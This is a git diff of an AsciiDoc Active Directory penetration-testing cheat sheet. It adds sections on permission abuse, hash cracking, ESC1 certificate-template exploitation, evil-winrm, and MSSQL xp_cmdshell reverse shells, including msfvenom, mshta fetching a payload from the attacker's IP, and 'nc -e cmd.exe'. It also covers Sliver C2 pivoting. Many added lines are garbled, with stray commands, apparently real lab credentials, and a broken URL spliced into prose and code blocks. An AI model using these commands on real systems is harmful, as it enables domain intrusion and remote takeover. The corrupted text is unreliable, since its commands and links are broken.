@@ -13,7 +13,17 @@
 - <<NTLM, NTLM Relay Attack>>
 - <<Bloodhound, Bloodhound>>
 - <<perms, Permisions in AD>>
+  * <<generetic, GenereticAll>>
   * <<generetic, GenereticWrite>>
+- <<crack, Hashcat and John>>
+  * <<hashcat, Hashcat>>
+  * <<john, John>>
+- <<templates, Vulnerable Certificate Templates>>
+- <<rm, Remote Managment>>
+  * <<evil, Evil-Winrm>>
+  * <<xfreerdp, XfreeRDP>>
+- <<database, Databases>>
+- <<forwarding, Port-Forwarding and Sliver C2>>
 
 [[overview]]
 == Overview
@@ -49,10 +59,12 @@ Two scenarios is possible ...
 == ASREPRoast
 
 This `command` returns hash of all users which doesn't have a Kerberos pre-authentication or not required
+john --show hash.john
 
 *Without Auth*
 
-```bash
+```bashjohn --show hash.john
+
 nxc ldap $target -u 'username' -p '' --asreproast output.txt
 ```
 
@@ -60,11 +72,13 @@ nxc ldap $target -u 'username' -p '' --asreproast output.txt
 
 If exists dumped or some wordlits of users
 
-```bash
+```bashpython3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'FuckPass!@' 
+
 nxc ldap $target -u user.txt -p '' --asreproast output.txt
 ```
 
 *With authentication*
+john --show hash.john
 
 ```bash
 nxc ldap $target -u 'username' -p 'password' --asreproast output.txt
@@ -82,27 +96,31 @@ More info about https://www.netexec.wiki/ldap-protocol/asreproast[here]
 == Kerberoasting
 
 Kerberoasting is an attack against Active Directory where an attacker requests Kerberos service tickets for service accounts and then cracks them offline to obtain their passwords. It works because the tickets are encrypted with the service account’s password hash, which may be weak or unchanged for long periods.
-
+hashcat hash.soul.txt  /home/kali/woREMOTE MANAGEMENT USERSrdlists/passwords/rockyou.txt     
 Also can be done via tool `nxc` netexec
 
 ```bash
-nxc ldap $target -u 'username' -p 'username' --kerberoasting output.txt
+nxc ldap $target -u 'username' -p 'username' --kerberoastPermisionsing output.txt
 ```
 
 *Kerberoasting via AS-REP Roasting*
 
 ```bash
-nxc ldap $target -u 'username' -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
-```
+nxc ldap $target -u 'username' -p '' --john --show hash.john
+no-preauth-targets kerberoastable.list --kerberoasting output.txt
+```john --show hash.john
 
-More info about https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting[here]
+
+More info about https://www.nebloodyAD --host "10.1.107.118" -d 'dc01.hacksmarter.local' -u  'yorinobu' -p  'FuckPass!@' set password 'soulkiller.svc' 'FuckPass!@!@@'
+texec.wiki/ldap-protocol/kerberoasting#kerberoasting[here]
 
 [[Smb]]
 == SMB
 
 Enumerate *groups* , *users* via `smb`
 
-```bash
+```bashjohn --show hash.john
+
 nxc smb $target -u 'username' -p 'password' --rid # also --rid-brute
 ```
 
@@ -132,12 +150,15 @@ If exists *WRITE* permision in the `share` can be crafted a phishing link to cat
 Also is needed to start `responder` with `sudo` perms in target network
 
 Agaist `tun0` can be anouther, 
-
+Permisions
 ```bash
 sudo responder -I tun0
-```
+```john --show hash.john
+
+john --show hash.john
 
 When `responder` started craft `phish-link`
+certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
 
 ```bash
 nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phish SERVER=$server_in_responder 
@@ -146,7 +167,8 @@ nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phi
 [[Bloodhound]]
 == Bloodhound
 
-*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain higher access in the domain.
+*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain bloodyAD --host "10.1.107.118" -d 'dc01.hacksmarter.local' -u  'yorinobu' -p  'FuckPass!@' set password 'soulkiller.svc' 'FuckPass!@!@@'
+higher access in the domain.
 
 If port ralated to `ldap` is open can be grabbed info about system , also must be compromised user with valid creds.
 
@@ -171,8 +193,287 @@ bloodhound-cli
 [[perms]]
 == Permisions in AD
 
+Perms which can be enumerated by tool `bloodhound`
+john --show hash.john
+
 [[generetic]]
+=== GenereticAlljohn --show hash.john
+certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
+
+
+This permision over user gives a *full controll*, used to *change password* (common) or anouther things
+
+Changing pass by tool `BloodyAD`
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set password 'user2' 'pass2'
+```
+
+So it's can be as "Change password of user2 by user with pass and change to pass2",
+
+[[generetic2]]
 === GenereticWrite
+
+This permision over user can be used for changing atributes of target object so can be automated by tool `targetedKerberoast.py` , by atribute *servicePrincipalName* adds SPN and do kerberoasting. Could be cathed a hash of target user
+
+```bash
+python3 targetedKerberoast.py -v -d '$target_domain' -u 'username' -p 'password' 
+```
+
+
+[[crack]]
+== Hashcat and John
+
+Cracking tool used by penetration testers / red teamers. Use after dumping a hashes, open locked file by password.
+
+[[hashcat]]
+=== Hashcat
+
+If exist some hash
+
+```bash
+hashcat hash.txt  rockyou.txt     
+```
+
+Also can be modified with flags `-m` , `-a`, with wordlist of hashes when all must be cracked
+
+```bash
+hashcat -m 0 -a 0 hash_pass.txt rockyou.txt --keep-guessing -O
+```
+
+[[john]]
+=== John
+
+If exist some locked pdf, zip or anoutherjohn --show hash.john
+ it's all the same process
+
+```bash
+pdf2john file.pdf > hash.john 
+```
+REMOTE MANAGEMENT USERS
+For `zip` files can be used tool `zip2john`
+
+Transform pdf hash to john format
+john --show hash.john
+
+```bash
+john hash.john --wordlist:rockyou.txt
+# then
+john --show hash.john
+```
+
+[[templates]]
+== Vulnerable Certificate Templates
+
+The most common it's when service accounts have access to domain, should be checked template vulnerabilities. Named as ESC1 - ESC15 this how named vulnerabilities, the best tool to exploit this `certipy` or `certipy-ad`. More info https://www.thehacker.recipes/ad/movement/adcs/[here]
+
+* First step is find vulnerability
+
+```bash
+certipy-ad find -u user@domain -p 'pass' -dc-ip $domain_ip -vulnerable
+```
+
+Returns .txt file which contains report of vulns
+
+* Second step do request to catch template
+
+```bash
+certipy-ad req -u user -p 'password' -ca template-dc01-ca -target target_domain -template template -upn user@domain -sid S-1-1-11-3154413470-3340737026-2748725799-1601
+
+```
+
+`-template` taken from .txt file in field `TemplateName`
+`-ca` taken from .txt file in field `Certificate Subject` looks like CN=hacks-DC01-CA
+`-upn` target user in AD
+`-sid` can be taken from `bloodhound` 
+
+Returns a *.pfx* file of target user
+
+* Third step 
+
+```bash
+certipy-ad auth -pfx 'user.pfx' -dc-ip domain_ip
+```
+
+Returns a `hash` of target user
+
+It was example for `ESC1` vulnerable template
+
+[[rm]]
+== Remote Managment
+
+If user exists in group *REMOTE MANAGEMENT USERS* or *DESKTOP REMOTE MANAGEMENT USERS* remote connection to target machine is possible by `evil-winrm` or `xfreerdp`
+
+[[evil]]
+=== Evil-Winrm
+
+*Requirements* : user exists in group *REMOTE MANAGEMENT USERS*
+
+*By password*
+
+```bash
+evil-winrm -i ip -u 'user' -p 'pass'
+```
+
+*By hash*
+
+```bash
+evil-winrm -i ip -u 'user' -H 'd87640b0d83dc7f90f5f30bd6789b133'
+```
+
+
+[[xfreerdp]]
+=== XfreeRDP
+
+*Requirements* : `RDP` port is open , user exists in *DESKTOP REMOTE MANAGEMENT USERS*
+
+```bash
+xfreerdp /v:ip   /u:user   /p:'password'  /w:1920 /h:1080 /fonts /smart-sizing
+```
+
+[[database]]
+== Databases
+
+If enumerated a database in Active Directory , attacker can connect to it by tool `impacket-mssqlclient`. Also if database is running at `localhost` , must do `Port-Forwarding`. Anouther thing is `proxychains` can be configured in `/etc/proxychains.conf` next section will be about this.
+
+Connect to database
+
+```bash
+proxychains4 -q impacket-mssqlclient 'domain'/'user':'password@@'@127.0.0.1 -windows-auth
+```
+
+If it connect with anouther user which have more privileges , main goal is to take `reverse shell`.
+
+In database shell
+
+```bash
+enable_xp_cmdshell
+```
+
+Check if works
+
+```bash
+xp_cmdshell whoami
+```
+
+Reverse shell can be done go https://www.revshells.com/[here] this site creates reverse shell with your `ip` and `port` use `PowerShell #3 (Base64)` copy reverse shell command
+
+```bash
+xp_cmdshell powershell -e JAB...
+```
+
+Start listener
+
+```bash
+rlwrap nc -lvnp  9001
+```
+
+Without site can be done by `msfvenom` in `.hta` file
+
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=$your_ip lport=9001 -f hta-psh > shell.hta
+```
+
+Into database shell
+
+```bash
+xp_cmdshell "mshta http://$your_ip/shell.hta"
+```
+
+Then start listener
+
+About reverse shells by binary files
+
+```bash
+windows-binaries -h
+```
+
+```bash
+xp_cmdshell "powershell wget http://$your_ip/nc.exe -OutFile c:\UsersPublic\nc.exe"
+xp_cmdshell  "c:\UsersPublic\nc.exe -e cmd.exe $your_ip &your_port"
+```
+
+[[forwarding]]
+== Port-Forwarding and Sliver C2
+
+If some services is runned at `localhost` to enumerate this
+
+```bash
+netstat -ano
+```
+
+Returns all services that is running at `machine` and returns a `PID` value - looks like 4200
+
+```bash
+tasklist 4200
+```
+
+This returns what servise is running at this port
+
+Great tool to `Port-Forwarding` is *Sliver C2* tool more info https://sliver.sh/[here]
+
+Also can be used for `reverse shell` in `sessions`
+
+*Install and starting*
+
+```bash
+curl https://sliver.sh/install | sudo bash
+#
+sudo systemctl start sliver
+#
+sliver
+```
+
+Into sliver
+
+Command generates `.exe` file which must be executed in target machine, in this example named `pivot.exe`
+
+```bash
+generate --mtls $your_ip:$your_port --save pivot.exe --os windows
+```
+
+Start listener
+
+```bash
+mtls -L $your_ip -l $your_port
+```
+
+In target machine run file
+
+```bash
+./pivot.exe
+```
+
+In `Sliver` , view and connect to session
+
+```bash
+sessions
+#
+sessions -i $session_id
+```
+
+$session_id looks like `5b4640a8`
+
+
+Sliver C2 configured in proxy `SOCKS5` so need to change a `/etc/proxychains.conf` to `SOCKS5` in port `1081`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
